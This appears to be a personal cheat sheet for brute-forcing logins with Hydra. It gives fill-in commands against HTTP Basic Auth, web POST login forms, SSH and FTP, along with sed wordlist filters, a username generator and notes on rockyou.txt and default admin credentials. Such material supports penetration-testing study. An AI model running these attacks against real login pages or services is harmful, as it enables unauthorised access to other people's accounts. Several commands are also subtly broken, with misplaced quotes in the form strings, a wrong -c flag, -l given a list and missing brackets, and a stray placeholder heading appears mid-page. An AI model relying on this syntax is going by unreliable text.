---
layout: default
---

<link rel="shortcut icon" type="image/x-icon" href="favicon.ico">

<[Back to Main Page](../index.html)


# Brute Forcing Login Forms
Created by Bujitha Ponsuge


# Commands
The Following are commands that you can use with Hydra to brute force an Basic HTTP Auth Form

## Brute Forcing Basic HTTP Auth Forms Using Default Credentials using Hydra

|	Options		|	Description	|
|-----------|:-----------|
|-C | Allows to use Combined Wordlists|
|http-get|	This is the Request Method						|
|/ | The Target Path

Combined Wordlist

```console
hydra -C /usr/share/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt <Target IP> -s <PORT> http-get /
```

Username/Password Brute Force

```console
hydra -L /usr/share/SecLists/Usernames/Names/names.txt -P /usr/share//SecLists/Passwords/Leaked-Databases/rockyou.txt -u -f Target IP> -s <PORT> http-get /
```

Username Brute Force

```console
hydra -L /usr/share/SecLists/Usernames/Names/names.txt -p <PASSWORD> -u -f Target IP> -s <PORT> http-get /
```

Password Brute Force

```console
hydra -l <USERNAME> -P /usr/share//SecLists/Passwords/Leaked-Databases/rockyou.txt -u -f Target IP> -s <PORT> http-get /
```

# Web Forms/Login Forms Brute Forcing using **Hydra**

Following Commands are useful to brute force Login Forms (Admin Panels etc..) using the Hydra Module **http[s]-post-form**

> To Determine if the **http[s]-post-form** is the correct module to use. Type something into the login form and check if the URL has any of the inputs that you put in or if the URL change in anyway, If the URL does not change then the Web Application will be using an POST form. If the URL change and or have any of our inputs then its an GET form.
> 

Combined Wordlist

```console
hydra -c /usr/share/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt <Target IP> -s <Target Port> http-post-form "/login.php:user=^USER^&pass="^PASS^:[Success or Failed String]
```

Username/Password Brute Force

```console
hydra -L /usr/share/SecLists/Usernames/Names/names.txt -P /usr/share//SecLists/Passwords/Leaked-Databases/rockyou.txt <Target IP> -s <Target Port> http-post-form "/login.php:user=^USER^&pass="^PASS^:[Success or Failed String]
```

Password Brute Force

> NOTE: Try default usernames that are often used in admin panels.
>  admin,administrator,wpadmin, root etc.

```console
hydra -l admin -P /usr/share//SecLists/Passwords/Leaked-Databases/rockyou.txt <Target IP> -s <Target Port> http-post-form "/login.php:user=^USER^&pass="^PASS^:[Success or Failed String]
```
# PLACEHOLDER

# Useful Commands
The following commands can help if you want to create a personalized wordlist


```console
sed -ri '/^.{,7}$/d' file.txt
```
This command will remove anything that is shorter than eight characters 
```console
sed -ri '/[!-/:-@\[-`\{-~]+/!d' file.txt
```
This command will remove anything that does not contain special characters
```console
sed -ri '/[0-9]+/!d' file.txt
```
This will remove anything that has no numbers

```console
git clone https://github.com/urbanadventurer/username-anarchy.git
cd username-anarchy
./username-anarchy Name-of-target > file.txt
```

This tool can be used to create a custom username wordlist, using an name of an user.

# Service Authentication Brute Forcing (SSH & FTP)

[!] Use This command if you created an world-list and password-list based of an username.
```console
hydra -L username-list -P password-list -u -f ssh://<TargetIP:Port> -t 4 
```

```console
hydra -l username-list -P password-list ftp://<FTPIP>
```

## Notes

Brute Forcing is basically an method of attempting to attackers trying many passwords and usernames with hopes of eventually guessing the correct one using specialized tools and public wordlists that contains default passwords and usernames that are used by many users.

Since most passwords are not stored in clear text documents but instead hashed as hash values on files, an Brute Force needs to go through a list of passwords and try to match them with an hash value and once the hash value has been matched it would then essentially show them to the attacker to use. This is called offline brute-forcing.

The Above commands are used for online brute-forcing and is mainly used for brute forcing website's login forms.
Since most Websites would always have an login area for users including administrators, either hidden or in plain sight in some if not most cases, and since most usernames can be recognized easily and since majority of users wont use complex passwords since its harder to remember, it allows attackers to easily gain access into accounts as long as proper enumeration is done so they can get an good grip on it's system.

Variety of tools and methods can be used for login brute forcing such as:

- Hydra
- Medusa
- john the Ripper
- wfuzz

and many more.

Many web servers that are currently active still uses Basic HTTP AUTH scheme, which is essentials transmits credentials and passwords using Base64 encodings. This is essentailyl just using two fields an Username and Password as its only authentication reqcuirments.

In most cases its very common to find usernames and passwords used tother, especially when default service passwords are kept unchanged. You can find list of known password and list of default password in the [SecLists repository](https://github.com/danielmiessler/SecLists) and you can also find it within [Kali repository](https://www.kali.org/tools/seclists/) (**If installing from within Kali, the default location for the saved password lists is "/usr/share/seclists/..."**).

Within the SecLists one of the most commonly used password list is **rockyou.txt** which is located in <font color=lightgreen>"/usr/share/seclists/passwords/Leaked-Databases/rockyou.txt"</font>, which has over 14 million unique passwords sorted by how common they are. 
> Note: To use the rockyou.txt you must first untar the file from within the directory using the command:
```bash
tar -xf /usr/share/seclists/passwords/Leaked-Databases/rockyou.txt.tar.gz
```
Hydra requires three specific flags to perform a brute force  attack on a web service:
1. **Credentials**
2. **Target Host**
3. **Target Path**

The **-C** flag can be used for credentials if the usernames and passwords are in an pair, or use <font color=lightgreen>-L</font> and <font color=lightgreen>-P</font> respectfully for usernames and passwords.
And to save time by not brute forcing all the usernames with the combination of passwords we can specify the <font color=lightgreen>-f</font> flag to stop hydra after the first successfully login. Also adding the <font color=lightgreen>-u</font> flag will make ti so that hydra tries all users on each password, instead of trying all 14 million passwords on one user before moving to the next.

If you find a website that has an admin panel that you can view, try the very top 10 most popular administrators credentials such as, **admin:admin** etc.

Hydra provides many different types of request parameters you can use to brute force different services.
```console
hydra -h | grep "Supported Services" | tr ":" "\n" | tr " " "\n" | column
```
> This will output the Supported Services in a table

When you run the command you will find multiple supported services, when it comes to web from brute forcing, only two would be of use amd these are.

- http[s]-{head-get-post}
- https[s]-post-form

The http[s]-{head|get|post} serves for basic HTTP authentication while the second one https[s]-post-form is used for login forms like .php or .aspx among others

To use https[s]-post-form we need to provide three parameter separated by **:**.

The first parameter is the URL PATH which will holds the login form.
```
Example

/admin_panel.php

```
Second parameter is the POST parameters which holds the username and password

```
Example

/admin_panel.php:user=^USER^&pass="^PASS^

```
The last parameters is the failed/success login string, which tells hydra to recognize whether the login attempt was successful or not.
Since we cannot login in, we wont be able to know how the page would look like after an successful login, thus we wont be able to specify a success string to look for.
```
Example

/admin_panel.php:user=^USER^&pass="^PASS^:[Fail/Success]=Failed/Success string

```

Since we cannot use a success string we need to use a failed string. The reason Fail/Success get used by hydra is so that it could distinguish between successfully submitted credentials and failed ones. The way to obtain these strings is by looking through the source code of the page were using to login in. Hydra will examine the HTML code of the response page that it gets after each attempts looking for the string we provided.

There are two different types of Flags that can be used for the Fail/Success String.

First is the **(F=html_content)**, which is used as the Flag for the Fail String. The **(S=html_content)** is used for the Success String.

If a fail string is provided it will keep looking until that string is not found in the response page, if we provide a success string it will keep looking until it finds the strings that was provided

----
